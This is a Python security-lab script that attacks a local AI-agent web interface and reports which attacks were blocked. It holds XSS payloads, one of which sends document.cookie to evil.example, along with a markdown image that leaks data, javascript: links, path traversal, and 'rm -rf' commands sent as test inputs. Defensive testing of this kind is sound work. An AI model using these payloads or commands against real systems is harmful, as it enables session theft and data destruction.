"""Lesson 57 lab: attack the web UI the way a hostile web page, a model that read a poisoned file, or another program on this
computer would, and print which attacks were blocked.

    python scripts/web_attack_lab.py              # against this checkout's code
    (the lesson ran it in a worktree at lesson-56 too: the "before" column)

The server runs in this process with a scripted model on a free port; httpx plays the browser (with the cookie) and the
attacker (without it, or with the cookie but from another origin, as a browser without SameSite would send it).
"""
import json
import shutil
import subprocess
import sys
import tempfile
import threading
import webbrowser
from pathlib import Path
from urllib.parse import urlparse
from urllib.request import url2pathname

import httpx

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from harness import config  # noqa: E402
from harness.commands import load_commands  # noqa: E402
from harness.config import Settings  # noqa: E402
from harness.messages import Message, Reply, ToolCall, Usage  # noqa: E402
from harness.session import Session  # noqa: E402
from harness.web import server as web  # noqa: E402
from harness.workspace import Workspace  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8")
EVIL = "https://evil.example"
PAYLOADS = ["<script>fetch('https://evil.example/?c='+document.cookie)</script>", "<img src=x onerror=alert(1)>",
            "![x](https://evil.example/?d=SECRET)", "[click](javascript:alert(1))", "<iframe src=https://evil.example>",
            "<svg onload=alert(1)>", "| <a href=javascript:alert(1)>x</a> |\n|---|"]


class Script:
    model = "script"

    def __init__(self):
        self.replies = [Reply(Message("assistant", tool_calls=[ToolCall("c1", "write_file", {"path": "x.txt", "content": "x"})]), "tool_calls", Usage()),
                        Reply(Message("assistant", "done"), "end", Usage())]

    def chat(self, messages, tools):
        return self.replies.pop(0) if self.replies else Reply(Message("assistant", "ok"), "end", Usage())


def lab():
    home = Path(tempfile.mkdtemp())
    config.USER_DIR = home / ".harness"
    root = home / "project"
    root.mkdir()
    ui = web.WebUI(web.Hub())
    session = Session(Settings(save_chats=False, auto_memory="off", journal="off", file_history=False, todo=False, audit_log=False),
                      Workspace(root), ui, web.WebApprover(ui) if hasattr(web, "WebApprover") else None, interface="web")
    session.agent.provider = Script()
    server = web.start(session, load_commands(root), port=0)
    threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
    port, base = server.server_port, f"http://127.0.0.1:{server.server_port}"
    you = httpx.Client(base_url=base, timeout=10)
    first = you.get(server.url)
    stranger = httpx.Client(base_url=base, timeout=10)
    results = []

    def check(name, blocked, detail):
        results.append((name, blocked, detail))

    # --- a web page you visit (another origin, in your browser) ------------------------------------------------------------
    r = stranger.post("/api/send", json={"text": "run rm -rf ~"})
    check("cross-site request without the cookie (CSRF)", r.status_code == 401, r.status_code)
    r = you.post("/api/send", json={"text": "hi"}, headers={"Origin": EVIL})
    check("cross-site request that carries the cookie (a browser without SameSite)", r.status_code == 403, r.status_code)
    r = you.post("/api/send", content=json.dumps({"text": "hi"}), headers={"Content-Type": "text/plain"})
    check("an HTML form's text/plain POST shaped as JSON", r.status_code in (400, 403, 415), r.status_code)
    r = you.get("/api/state", headers={"Host": f"evil.example:{port}"})
    check("DNS rebinding (Host: evil.example)", r.status_code == 403, r.status_code)
    r = you.get("/api/state", headers={"Origin": EVIL})
    check("reading the state from another origin (CORS)", "access-control-allow-origin" not in r.headers, "no CORS header" if "access-control-allow-origin" not in r.headers else r.headers["access-control-allow-origin"])
    page = you.get("/")
    csp = page.headers.get("content-security-policy", "")
    check("framing the page to trick a click on Yes (clickjacking)", page.headers.get("x-frame-options") == "DENY" or "frame-ancestors 'none'" in csp,
          page.headers.get("x-frame-options") or csp or "no header")
    check("a script injected into the page runs (Content-Security-Policy)", "script-src 'self'" in csp and "unsafe-inline" not in csp, csp or "no CSP")
    js = you.get("/static/app.js")
    check("content sniffing (nosniff)", js.headers.get("x-content-type-options") == "nosniff", js.headers.get("x-content-type-options") or "no header")
    check("the address leaks to linked sites (Referrer-Policy)", page.headers.get("referrer-policy") == "no-referrer", page.headers.get("referrer-policy") or "no header")
    r = stranger.get("/events")
    check("reading the event stream without the cookie", r.status_code == 401, r.status_code)
    cookie = first.headers.get("set-cookie", "")
    check("the cookie readable by script, or sent cross-site", "HttpOnly" in cookie and "SameSite=Strict" in cookie, cookie.split(";", 1)[1].strip() if ";" in cookie else cookie)

    # --- a request that tries to reach further ---------------------------------------------------------------------------
    r = you.get("/static/..%2F..%2Fconfig.py")
    check("a static file outside the page's files", r.status_code == 404, r.status_code)
    r = you.get("/api/file", params={"path": "../../../Windows/win.ini"})
    check("a file outside the workspace through the viewer", r.status_code == 403, r.status_code)
    try:
        status = you.post("/api/send", content=b"{" + b" " * 2_000_000 + b"}", headers={"Content-Type": "application/json"}).status_code
    except httpx.HTTPError:
        status = "closed before reading it"          # refused without reading: the client was still sending
    check("a 2 MB body", status in (400, 413, "closed before reading it"), status)

    # --- answers that weren't offered ---------------------------------------------------------------------------------------
    if hasattr(ui, "question"):
        you.post("/api/send", json={"text": "write x.txt"})
        with you.stream("GET", "/events?after=0") as s:
            q = next(json.loads(line[6:]) for line in s.iter_lines() if line.startswith("data: ") and '"question"' in line)
        r = you.post("/api/answer", json={"id": q["id"], "answer": "rm -rf /"})
        check("an answer that wasn't offered", r.status_code == 400, r.status_code)
        you.post("/api/answer", json={"id": q["id"], "answer": "no"})
        r = you.post("/api/answer", json={"id": q["id"], "answer": "yes"})
        check("a second answer after the first (another tab, a replay)", r.status_code == 409, r.status_code)

    # --- the model's words in the page -------------------------------------------------------------------------------------
    node, script = shutil.which("node"), ROOT / "harness" / "web" / "static" / "markdown.js"
    if node and script.exists():
        run = ('const fs=require("fs"),vm=require("vm");const p={};vm.createContext(p);vm.runInContext(fs.readFileSync(process.argv[1],"utf8"),p);'
               'process.stdout.write(JSON.stringify(JSON.parse(fs.readFileSync(0,"utf8")).map(t=>p.md(t))))')
        out = json.loads(subprocess.run([node, "-e", run, str(script)], input=json.dumps(PAYLOADS), capture_output=True, text=True, encoding="utf-8").stdout)
        bad = [h for h in out if any(tag in h for tag in ("<script", "<img", "<iframe", "<svg", 'href="javascript'))]
        check(f"script, picture or javascript: link in the model's answer ({len(PAYLOADS)} payloads)", not bad, f"{len(bad)} got through")

    # --- another program on this computer ------------------------------------------------------------------------------------
    opened = []

    class Opened(Exception):
        pass

    def fake_open(url, *args, **kwargs):
        opened.append(url)
        if url.startswith("file:"):                  # the private redirect holds a key: don't leave it behind
            Path(url2pathname(urlparse(url).path)).unlink(missing_ok=True)
        raise Opened
    real, webbrowser.open = webbrowser.open, fake_open
    try:
        web.serve(root, {"save_chats": False, "journal": "off", "auto_memory": "off"}, port=0)
    except Opened:
        pass
    finally:
        webbrowser.open = real
    shown = opened[0] if opened else ""
    check("the key on the browser's command line (other users can list processes)", bool(shown) and "key=" not in shown,
          shown.split("?")[0] + ("?key=..." if "key=" in shown else ""))

    server.closing = True
    server.shutdown()
    width = max(len(n) for n, _, _ in results)
    for name, blocked, detail in results:
        print(f"{'blocked' if blocked else 'OPEN   '}  {name:<{width}}  {detail}")
    print(f"\n{sum(b for _, b, _ in results)} of {len(results)} blocked")


if __name__ == "__main__":
    lab()
